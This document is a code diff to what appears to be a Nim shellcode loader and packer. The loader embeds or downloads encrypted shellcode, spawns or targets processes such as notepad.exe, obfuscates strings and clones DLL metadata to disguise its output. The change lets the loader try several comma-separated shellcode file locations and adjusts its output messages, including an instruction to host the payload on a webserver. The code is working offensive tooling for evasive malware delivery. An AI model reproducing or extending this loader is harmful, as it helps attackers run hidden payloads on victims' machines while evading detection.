@@ -94,7 +94,7 @@ Options:
 [Shellcode retrieval options]
 
   By default, the Loader will embed the Shellcode into the output file. There are two alternatives to this:  
-  --shellcodeFile shellcodefile    Filename to retrieve shellcode from - on Runtime (No embedding)
+  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve shellcode from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
   --shellcodeURL shellcodeURL    URL to retrieve shellcode from
 
 [DLL options]
@@ -195,7 +195,8 @@ var
     targetdomain : string = ""
     processname: string = ""
     customspawnprocess: string = "notepad.exe"
-    shellcodeFile: string = "enc.blob"
+    shellcodeFile: seq[string] = @["enc.blob"]
+    scfile: string = ""
     retrieveFromFile: bool = false
     shellcodeURL: string = ""
     retrieveFromURL: bool = false
@@ -292,11 +293,12 @@ if args["--peload"]:
 if args["--shellcodeFile"]:
     retrieveFromFile = true
     let shellcodeFilestring = args["--shellcodeFile"]
-    shellcodeFile = fmt"{shellcodeFilestring}"
+    scfile = fmt"{shellcodeFilestring}"
+    shellcodeFile = scfile.split(',')
 
 if args["--shellcodeURL"]:
     retrieveFromURL = true
-    shellcodeFile = "WebserverPayload.bin"
+    shellcodeFile = @["WebserverPayload.bin"]
     let shellcodeURLstring = args["--shellcodeURL"]
     shellcodeURL = fmt"{shellcodeURLstring}"
 
@@ -663,7 +665,7 @@ ectx.clear()
 echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
-writeFile(shellcodeFile, content)
+writeFile(shellcodeFile[0], content)
 
 proc getRandStub (): string =
   var randName: string = rndStr(rand(10..25))
@@ -849,8 +851,15 @@ var remoteprocesses: seq[string] = {remoteprocesses}
 let ShellcodeFromFileStub * = fmt"""
 
 var fileHandle: File
-fileHandle = open("{shellcodeFile}", fmRead)
-var encString = fileHandle.readAll()
+var encString: string
+for f in {shellcodeFile}:
+    try:
+        fileHandle = open(f, fmRead)
+        encString = fileHandle.readAll()
+        break
+    except:
+        when defined(verbose):
+            echo obf("[-] Failed to open file: ") & f
 
 """
 
@@ -1762,9 +1771,10 @@ if(dll_out):
         else:
             discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
 
-let msg = fmt"[!] Encrypted file saved to {outfile}"
+let msg = fmt"[!] Loader saved to {outfile}"
 echo "\n" & msg
-
+if(retrieveFromFile):
+    echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
 if (callobfs):
     when system.hostOS == "windows":
         var outfileonlyname = outfile.replace(packerPath, "")
@@ -1817,4 +1827,4 @@ if (pump):
             writeFile(fmt"{outfile}",pumpsequence)
 
 if (retrieveFromURL):
-    echo fmt"[!] Make sure to host the {shellcodeFile} file on your webserver with the correct file-Name to have a working payload ;-)"
+    echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
